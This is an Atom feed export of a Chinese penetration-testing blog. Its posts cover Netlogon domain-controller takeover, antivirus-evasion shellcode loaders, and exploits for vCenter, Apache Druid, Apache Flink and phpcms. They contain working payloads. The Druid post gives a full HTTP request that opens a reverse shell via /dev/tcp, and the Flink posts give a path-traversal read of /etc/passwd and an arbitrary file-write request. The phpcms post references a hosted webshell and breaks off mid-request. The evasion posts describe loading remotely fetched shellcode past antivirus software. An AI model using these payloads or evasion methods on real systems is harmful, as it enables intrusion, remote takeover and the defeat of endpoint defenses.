<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>gshell&#39;s blog</title>
  
  <subtitle>安全記</subtitle>
  <link href="http://www.gsheller.top/atom.xml" rel="self"/>
  
  <link href="http://www.gsheller.top/"/>
  <updated>2021-08-09T01:41:09.118Z</updated>
  <id>http://www.gsheller.top/</id>
  
  <author>
    <name>gshell</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透_netlogon1472直取域控</title>
    <link href="http://www.gsheller.top/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/"/>
    <id>http://www.gsheller.top/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/</id>
    <published>2021-05-17T02:03:44.000Z</published>
    <updated>2021-08-09T01:41:09.118Z</updated>
    
    <content type="html"><![CDATA[<h5 id="域渗透-netlogon1472直取域控"><a href="#域渗透-netlogon1472直取域控" class="headerlink" title="域渗透_netlogon1472直取域控"></a>域渗透_netlogon1472直取域控</h5><p>前期拿到入口和域用户机器权限略过。</p><p>检测域控是否存在漏洞</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806113337772.png" alt="image-20210806113337772"></p><p>将域控密码置为空</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806113434873.png" alt="image-20210806113434873"></p><p>利用空密码导出所有用户hash</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806142823841.png" alt="image-20210806142823841"></p><p>hash传递获取域控shell</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806143126479.png" alt="image-20210806143126479"></p><p>域内机器</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210809093936516.png" alt="image-20210809093936516"></p><p>登录域控</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806143942162.png" alt="image-20210806143942162"></p><p>域内机器794台</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806144351632.png" alt="image-20210806144351632"></p><h5 id="还原域控账号密码"><a href="#还原域控账号密码" class="headerlink" title="还原域控账号密码"></a>还原域控账号密码</h5><p>pth，dump文件。</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210806161228363.png" alt="image-20210806161228363"></p><p>获取域控机器上原来的 Ntlm Hash 值，ACC值</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210809093435983.png" alt="image-20210809093435983"></p><p>还原密码即可。</p><p><img src="/2021/05/17/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon1472%E7%9B%B4%E5%8F%96%E5%9F%9F%E6%8E%A7/huanjing\github\Hexo\source_posts\域渗透-netlogon1472直取域控\image-20210809093535846.png" alt="image-20210809093535846"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;域渗透-netlogon1472直取域控&quot;&gt;&lt;a href=&quot;#域渗透-netlogon1472直取域控&quot; class=&quot;headerlink&quot; title=&quot;域渗透_netlogon1472直取域控&quot;&gt;&lt;/a&gt;域渗透_netlogon1472直取域控&lt;/h5&gt;&lt;</summary>
      
    
    
    
    <category term="内网系列" scheme="http://www.gsheller.top/categories/%E5%86%85%E7%BD%91%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="内网渗透，域渗透" scheme="http://www.gsheller.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%8C%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>免杀上线_c混淆加载免杀</title>
    <link href="http://www.gsheller.top/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/"/>
    <id>http://www.gsheller.top/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/</id>
    <published>2021-03-05T08:04:09.000Z</published>
    <updated>2021-03-05T10:01:44.384Z</updated>
    
    <content type="html"><![CDATA[<h4 id="免杀上线-变形shellcode，c混淆加载免杀"><a href="#免杀上线-变形shellcode，c混淆加载免杀" class="headerlink" title="免杀上线_变形shellcode，c混淆加载免杀"></a>免杀上线_变形shellcode，c混淆加载免杀</h4><h5 id="变形shellcode"><a href="#变形shellcode" class="headerlink" title="变形shellcode"></a>变形shellcode</h5><p>通过异或，添加随机字符，等来变形shellcode</p><img src="/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/1.jpg" width="1000"><h5 id="c还原加载"><a href="#c还原加载" class="headerlink" title="c还原加载"></a>c还原加载</h5><img src="/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/2.jpg" width="1000"><h5 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h5><img src="/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/3.jpg" width="1000"><h5 id="执行上线"><a href="#执行上线" class="headerlink" title="执行上线"></a>执行上线</h5><img src="/2021/03/05/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-c%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80/3.jpg" width="1000">]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;免杀上线-变形shellcode，c混淆加载免杀&quot;&gt;&lt;a href=&quot;#免杀上线-变形shellcode，c混淆加载免杀&quot; class=&quot;headerlink&quot; title=&quot;免杀上线_变形shellcode，c混淆加载免杀&quot;&gt;&lt;/a&gt;免杀上线_变形shellco</summary>
      
    
    
    
    <category term="免杀系列" scheme="http://www.gsheller.top/categories/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="安全研究，免杀系列" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%EF%BC%8C%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>漏洞推送_vmware vCenter 6.5-7.0 RCE</title>
    <link href="http://www.gsheller.top/2021/02/26/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-vmware-vCenter-6-5-7-0-RCE/"/>
    <id>http://www.gsheller.top/2021/02/26/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-vmware-vCenter-6-5-7-0-RCE/</id>
    <published>2021-02-26T08:26:47.000Z</published>
    <updated>2021-03-04T09:30:32.495Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Vmware-vCenter-6-5-7-0-RCE（CVE-2021-21972）"><a href="#Vmware-vCenter-6-5-7-0-RCE（CVE-2021-21972）" class="headerlink" title="Vmware vCenter 6.5-7.0 RCE（CVE-2021-21972）"></a>Vmware vCenter 6.5-7.0 RCE（CVE-2021-21972）</h4><h5 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a><strong>漏洞描述：</strong></h5><p>VMware  vCenter Server是美国威睿（VMware）公司的一套服务器和虚拟化管理软件。该软件提供了一个用于管理VMware vCenter环境的集中式平台，攻击者可通过访问web管理端向vCenter Server发送请求从而在操作系统上执行任意命令或者上传一个webshell到vcenter服务器的任意位置执行</p><h5 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本：</strong></h5><p>vmware:vcenter_server7.0 U1c 之前的 7.0 版本</p><p>vmware:vcenter_server`6.7 U3l 之前的 6.7 版本</p><p>vmware:vcenter_server`6.5 U3n 之前的 6.5 版本</p><h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h5><p>利用exp直接上传webshell：</p><h5 id="个人工具："><a href="#个人工具：" class="headerlink" title="个人工具："></a>个人工具：</h5><p><a href="https://github.com/gsheller/vcenter_rce">https://github.com/gsheller/vcenter_rce</a></p><img src="/2021/02/26/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-vmware-vCenter-6-5-7-0-RCE/1.jpg" width="1000"><img src="/2021/02/26/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-vmware-vCenter-6-5-7-0-RCE/2.jpg" width="1000"><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>升级到安全版本：</p><p>- vCenter Server 7.0 版本升级到 7.0.U1c</p><p>- vCenter Server 6.7版本升级到 6.7.U3l</p><p>- vCenter Server 6.5版本升级到 6.5 U3n</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Vmware-vCenter-6-5-7-0-RCE（CVE-2021-21972）&quot;&gt;&lt;a href=&quot;#Vmware-vCenter-6-5-7-0-RCE（CVE-2021-21972）&quot; class=&quot;headerlink&quot; title=&quot;Vmware v</summary>
      
    
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/categories/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
    
    <category term="漏洞推送，利用工具" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81%EF%BC%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞推送_Apache Druid远程代码执行</title>
    <link href="http://www.gsheller.top/2021/02/02/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://www.gsheller.top/2021/02/02/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-02-02T09:30:20.000Z</published>
    <updated>2021-03-04T09:30:18.193Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-Druid远程代码执行（CVE-2021-25646）"><a href="#Apache-Druid远程代码执行（CVE-2021-25646）" class="headerlink" title="Apache Druid远程代码执行（CVE-2021-25646）"></a>Apache Druid远程代码执行（CVE-2021-25646）</h4><h5 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a><strong>漏洞描述：</strong></h5><p>2021年01月30日，Apache官方发布安全公告，公开了Druid中的一个远程代码执行漏洞（CVE-2021-25646）。</p><p>Apache Druid能够执行嵌入在各种类型的请求中的用户提供的JavaScript代码，默认情况下该功能是禁用的。但在Druid  0.20.0及之前的版本中，不管该功能是否启用，经过认证的用户可以发送恶意请求来使Druid强制运行该请求中的JavaScript代码，成功利用此漏洞的攻击者可以利用Druid权限在目标系统上执行代码。</p><h5 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本：</strong></h5><p>Apache Druid &lt;= 0.20.0</p><h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h5><p>反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1046</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/vps/port 0&gt;&amp;1&#x27;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/02/02/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" width="1000"><h5 id="个人工具："><a href="#个人工具：" class="headerlink" title="个人工具："></a><strong>个人工具：</strong></h5><img src="/2021/02/02/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" width="1000"><p>批量检测：</p><img src="/2021/02/02/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" width="1000"><h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a><strong>修复建议：</strong></h5><p>升级版本至Druid 0.20.1。</p><p>下载链接：<a href="http://druid.apache.org/downloads.html">http://druid.apache.org/downloads.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Apache-Druid远程代码执行（CVE-2021-25646）&quot;&gt;&lt;a href=&quot;#Apache-Druid远程代码执行（CVE-2021-25646）&quot; class=&quot;headerlink&quot; title=&quot;Apache Druid远程代码执行（CVE-2</summary>
      
    
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/categories/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
    
    <category term="漏洞推送，利用工具" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81%EF%BC%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞推送_Apache flink任意文件读取/写入利用</title>
    <link href="http://www.gsheller.top/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/"/>
    <id>http://www.gsheller.top/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/</id>
    <published>2021-01-07T14:49:16.000Z</published>
    <updated>2021-03-04T09:30:26.349Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-flink任意文件读取-写入利用"><a href="#Apache-flink任意文件读取-写入利用" class="headerlink" title="Apache flink任意文件读取/写入利用"></a>Apache flink任意文件读取/写入利用</h4><h5 id="Apache-flink远程文件读取（CVE-2020-17519）"><a href="#Apache-flink远程文件读取（CVE-2020-17519）" class="headerlink" title="Apache flink远程文件读取（CVE-2020-17519）"></a>Apache flink远程文件读取（CVE-2020-17519）</h5><p><strong>漏洞描述：</strong></p><p>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能。</p><p>Apache Flink 1.11.0中引入的一项更改(包括版本1.11.1和1.11.2)允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p><p><strong>影响版本：</strong></p><p>1.11.0</p><p>1.11.1</p><p>1.11.2</p><p><strong>漏洞复现：</strong></p><p><code>http://ip:port/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/1.png" width="1000"><h5 id="Apache-Flink-任意文件写入漏洞（CVE-2020-17518）"><a href="#Apache-Flink-任意文件写入漏洞（CVE-2020-17518）" class="headerlink" title="Apache Flink 任意文件写入漏洞（CVE-2020-17518）"></a>Apache Flink 任意文件写入漏洞（CVE-2020-17518）</h5><p><strong>漏洞描述：</strong></p><p>该漏洞允许攻击者利用REST API，并通过精心构造的HTTP Header ，实现远程文件写入。</p><p><strong>影响版本：</strong></p><p>Apache Flink: 1.5.1 – 1.11.2</p><p><strong>漏洞复现：</strong></p><p><code>POST /jars/upload&#39;%2Bsss HTTP/1.1</code><br><code>Host: IP:port</code><br><code>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2689.88 Safari/537.36</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept: */*</code><br><code>Connection: close</code><br><code>Content-Length: 208</code><br><code>Content-Type: multipart/form-data; boundary=d29cb2ceaad12d3489229a652870361b</code></p><p><code>--d29cb2ceaad12d3489229a652870361b</code><br><code>Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../tmp/test&quot;</code><br><code>Content-Type: application/octet-stream</code></p><p><code>test</code></p><p><code>--d29cb2ceaad12d3489229a652870361b--</code></p><p>``</p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/2.png" width="1000"><h5 id="结合上传jar包进行RCE"><a href="#结合上传jar包进行RCE" class="headerlink" title="结合上传jar包进行RCE"></a>结合上传jar包进行RCE</h5><p>获取web路径</p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/3.jpg" width="1000"><p>上传jar包</p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/4.jpg" width="1000"><p>反弹shell</p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/5.jpg" width="1000"><h5 id="个人工具地址："><a href="#个人工具地址：" class="headerlink" title="个人工具地址："></a>个人工具地址：</h5><p><a href="https://github.com/gsheller/Flink_exp">https://github.com/gsheller/Flink_exp</a></p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/6.jpg" width="1000"><p>反弹shell</p><img src="/2021/01/07/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81-Apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5/7.jpg" width="1000"><p><strong>修复建议：</strong></p><p>将Flink升级到1.11.3或1.12.0，下载链接：</p><p><a href="https://flink.apache.org/downloads.html">https://flink.apache.org/downloads.html</a><br><a href="https://flink.apache.org/downloads.html">https://flink.apache.org/downloads.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Apache-flink任意文件读取-写入利用&quot;&gt;&lt;a href=&quot;#Apache-flink任意文件读取-写入利用&quot; class=&quot;headerlink&quot; title=&quot;Apache flink任意文件读取/写入利用&quot;&gt;&lt;/a&gt;Apache flink任意文件读</summary>
      
    
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/categories/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
    
    <category term="漏洞推送，利用工具" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81%EF%BC%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>免杀上线_python反序列化-分离免杀</title>
    <link href="http://www.gsheller.top/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/"/>
    <id>http://www.gsheller.top/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/</id>
    <published>2020-12-20T01:39:15.000Z</published>
    <updated>2021-03-05T08:01:47.625Z</updated>
    
    <content type="html"><![CDATA[<h4 id="免杀上线-python反序列化-分离免杀"><a href="#免杀上线-python反序列化-分离免杀" class="headerlink" title="免杀上线_python反序列化-分离免杀"></a>免杀上线_python反序列化-分离免杀</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>​    平时在渗透测试，红队行动中，要想通过已经获取的权限来进行内网渗透，扩大战果，一般可以通过上线cs或者msf来进行内网渗透。但基本上主机都安装有360，火绒等杀软，这时候就必须对上线的木马做免杀。</p><p>​    免杀技术可以有很多种，比如修改特征码，花指令，加壳，二次编译，分离免杀，资源修改，在制作免杀的过程中往往需要结合使用。</p><h5 id="免杀原理："><a href="#免杀原理：" class="headerlink" title="免杀原理："></a>免杀原理：</h5><p>​    通过对shellcode进行变形，比如编码，异或，添加特殊字符等等。然后从远程服务器读取shellcode，与执行程序的加载方法分离，来达到免杀效果。</p><h5 id="免杀实现："><a href="#免杀实现：" class="headerlink" title="免杀实现："></a>免杀实现：</h5><p>通过cs直接生成shellcode文件，并进行base64编码，并且放到web服务器上</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/1.jpg" width="1000"><p>通过python反序列化来，执行命令，加载shellcode，绕过杀软对加载器对命令执行函数的检测。</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/2.jpg" width="1000"><p>远程加载shellcode</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/3.jpg" width="1000"><p>利用python序列化生成序列化payload</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/4.jpg" width="1000"><p>利用python反序列化来执行上线</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/5.jpg" width="1000"><h5 id="免杀上线"><a href="#免杀上线" class="headerlink" title="免杀上线"></a>免杀上线</h5><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/6.jpg" width="1000"><p>但是多数服务器没有python环境，打包成exe</p><p>使用py2exe或者pyinstaller打包，修改图标，无dos窗口，执行上线：</p><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/7.jpg" width="1000"><img src="/2020/12/20/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF-python%E5%85%8D%E6%9D%80/8.jpg" width="1000">]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;免杀上线-python反序列化-分离免杀&quot;&gt;&lt;a href=&quot;#免杀上线-python反序列化-分离免杀&quot; class=&quot;headerlink&quot; title=&quot;免杀上线_python反序列化-分离免杀&quot;&gt;&lt;/a&gt;免杀上线_python反序列化-分离免杀&lt;/h4&gt;&lt;</summary>
      
    
    
    
    <category term="免杀系列" scheme="http://www.gsheller.top/categories/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="安全研究，免杀系列" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%EF%BC%8C%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>代码审计_phpcms_v9.6.0任意文件上传</title>
    <link href="http://www.gsheller.top/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://www.gsheller.top/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-11-05T07:22:24.000Z</published>
    <updated>2021-01-07T14:55:36.296Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码审计-phpcms-v9-6-0任意文件上传"><a href="#代码审计-phpcms-v9-6-0任意文件上传" class="headerlink" title="代码审计_phpcms_v9.6.0任意文件上传"></a>代码审计_phpcms_v9.6.0任意文件上传</h4><span id="more"></span><p><strong>漏洞描述：</strong></p><p>phpcms v9.6.0存在前台任意文件上传漏洞，攻击者可以在未授权的情况下任意文件上传，导致攻击者可以上传恶意文件获取web服务器权限。</p><p><strong>影响版本：</strong></p><p>phpcms v9.6.0</p><p><strong>利用条件：</strong></p><p>注册文件开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br></pre></td></tr></table></figure><p>需要公网webshell的txt（https不行，必须是http的）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://webshell-1257078281.cos.ap-nanjing.myqcloud.com/2234.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST 